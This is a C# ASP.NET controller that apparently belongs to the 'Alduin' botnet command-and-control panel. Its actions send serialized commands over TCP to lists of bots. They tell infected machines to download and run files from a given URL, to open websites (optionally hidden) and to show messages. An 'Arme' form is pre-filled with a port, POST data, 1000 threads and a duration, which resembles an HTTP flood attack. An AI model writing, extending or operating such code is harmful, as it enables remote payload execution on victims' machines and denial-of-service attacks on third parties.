using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Alduin.Server.Commands;
using Alduin.Web.Models;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Alduin.Server.Handler;
using MediatR;
using Alduin.Logic.Mediator.Queries;
using Alduin.Shared.DTOs;
using Alduin.Logic.Identity;
using Newtonsoft.Json;

namespace Alduin.Web.Controllers
{
    public class CommandsController : ControllerBase
    {
        private readonly IMediator _mediator;

        public CommandsController(IMediator mediator)
        {
            _mediator = mediator;
        }

        [Authorize]
        public IActionResult Index()
        {
            if(User.Claims.FirstOrDefault(c => c.Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/role").Value != "User")
            {
                return View();
            }
            else
            {
                return RedirectToAction(nameof(HomeController.Index), "Home");
            }
            
        }
        [Authorize]
        public IActionResult Stream()
        {
            if (User.Claims.FirstOrDefault(c => c.Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/role").Value != "User")
            {
                return View();
            }
            else
            {
                return RedirectToAction(nameof(HomeController.Index), "Home");
            }

        }
        [Authorize]
        [HttpGet]
        public IActionResult ExecuteFile()
        {
            return PartialView("_ExecuteFile");
        }
        [Authorize]
        [HttpGet]
        public IActionResult SendMessage()
        {
            return PartialView("_Message");
        }
        [Authorize]
        [HttpGet]
        public IActionResult OpenWebsite()
        {
            return PartialView("_OpenWebsite");
        }
        [Authorize]
        [HttpGet]
        public IActionResult Arme()
        {
            var model = new ArmeModel
            {
                Port = 80,
                PostDATA = "Dabala DUDU",
                ThreadstoUse = 1000,
                Time = 60
            };
            return PartialView("_ARME", model);
        }
        [Authorize]
        [HttpPost]
        public async Task<IActionResult> ExecuteCommand(ExecuteModel model)
        {
            if (!ModelState.IsValid)
                return View(model);
            if (User.Claims.FirstOrDefault(c => c.Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/role").Value == "User")
            {
                return RedirectToAction(nameof(HomeController.Index), "Home");
            }

            var Method = new BaseCommands
            {
                Method = "Execute"
            };
            var ExecuteVariables = new ExecuteVariables
            {
                Url = model.Url,
                Name = model.Name,
                Proxy = model.Proxy,
                Run = model.Run,
            };
            var ExecuteCommand = new ExecuteCommand
            {
                newBaseCommand = Method,
                newExecute = ExecuteVariables 
            };
            var bots = new GetBotsByStatusQuery { 
                status = model.Force
            };
            var botlist = await _mediator.Send(bots);
            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(ExecuteCommand).Replace(@"\", ""));
            return Json(response);
        }
        [Authorize]
        [HttpPost]
        public async Task<IActionResult> WebOpenCommand(WebsiteModel model)
        {
            if (!ModelState.IsValid)
                return View(model);
            if (User.Claims.FirstOrDefault(c => c.Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/role").Value == "User")
            {
                return RedirectToAction(nameof(HomeController.Index), "Home");
            }
            var websitevariables = new WebsiteVariables
            {
                Url = model.Url,
                Closed = model.Closed,
                Hidde = model.Hidde
            };
            var method = new BaseCommands
            {
                Method = "Execute"
            };
            var command = new WebsiteOpenModel
            {
                newBaseCommand = method,
                newWebsiteModel = websitevariables
            };
            var bots = new GetBotsByStatusQuery
            {
                status = model.Force
            };
            var botlist = await _mediator.Send(bots);
            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(command).Replace(@"\", ""));
            return Json(response);
        }
        [Authorize]
        [HttpPost]
        public async Task<IActionResult> SendMessageCommand(MessageModel model)
        {
            var method = new BaseCommands
            {
                Method = "Message"
            };
            var messageVariables = new MessageVariables 
            { 
                Msg = model.Msg,
                Closed = model.Closed
            };
            var messageCommand = new MessageCommand
            {
                newMessageVariables = messageVariables,
                newBaseCommand = method,
            };
            var bots = new GetBotsByStatusQuery
            {
                status = model.Force
            };
            var botlist = await _mediator.Send(bots);
            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(messageCommand).Replace(@"\", ""));
            return Json(response);
        }
    }
}